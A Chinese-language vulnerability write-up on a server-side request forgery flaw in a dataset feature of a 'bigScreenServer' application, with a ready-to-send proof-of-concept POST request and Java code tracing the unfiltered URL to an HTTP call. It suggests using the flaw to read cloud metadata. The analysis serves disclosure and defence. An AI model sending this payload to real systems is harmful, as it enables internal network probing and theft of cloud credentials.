# SSRF

## 漏洞原理

HTTP数据集功能接收客户端传入的http(s)地址，无任何过滤直接使用okhttp框架进行访问，导致ssrf

## POC

该漏洞有回显，因此若为云环境，可以使用该漏洞访问元数据

```http
POST /bigScreenServer/dataset/execute/test HTTP/1.1
Host: 192.168.239.1:8081
Content-Length: 312
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Content-Type: application/json; charset=UTF-8
Accept: */*
Origin: http://192.168.239.1:7521
Referer: http://192.168.239.1:7521/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_0febd9e3cacb3f627ddac64d52caac39=1773910763
Connection: keep-alive

{"script":"{\"className\":\"com.gccloud.dataset.entity.config.HttpDataSetConfig\",\"requestType\":\"backend\",\"method\":\"get\",\"url\":\"http://192.168.239.139:8081\",\"headers\":[],\"params\":[],\"body\":\"\",\"paramsList\":[],\"requestScript\":\"\",\"responseScript\":\"\"}","params":[],"dataSetType":"http"}
```

## 漏洞原理

controller代码和groovy-RCE相同，只是`dataSetType`变成了http，实现层代码位于`com.gccloud.dataset.service.impl.dataset.HttpDataSetServiceImpl`

```java
public DataVO execute(TestExecuteDTO executeDTO) {
        String apiInfoJson = executeDTO.getScript();
        if (StringUtils.isBlank(apiInfoJson)) {
            throw new GlobalException("数据集测试数据不能为空");
        } else {
            apiInfoJson = this.paramsClient.handleScript(executeDTO.getDataSetType(), apiInfoJson);
            HttpDataSetConfig config = (HttpDataSetConfig)JSON.parseObject(apiInfoJson, HttpDataSetConfig.class);
            List<DatasetParamDTO> paramList = executeDTO.getParams();
            paramList = this.paramsClient.handleParams(paramList);
            config = this.handleParams(config, paramList);
            DataVO dataVO = new DataVO();
            if (config.getRequestType().equals("frontend")) {
                dataVO.setData(config);
                return dataVO;
            } else {
                Object data = this.getBackendData(config, (DatasetEntity)null);
                dataVO.setData(data);
                return dataVO;
            }
        }
    }
```

http调用代码在`Object data = this.getBackendData(config, (DatasetEntity)null);`

所以这里的if条件就不能满足，能不能满足取决于requestType参数的值，只要不是frontend都行

最后来到sink处，`HttpUtils.get`

```java
response = null;
        Response response;
        switch (config.getMethod().toUpperCase()) {
            case "GET":
                response = HttpUtils.get(url.toString(), (Map)headers);
                break;
            case "POST":
                Map<String, Object> upperCaseHeaders = Maps.newHashMap();
                Iterator var15 = ((Map)headers).entrySet().iterator();
```

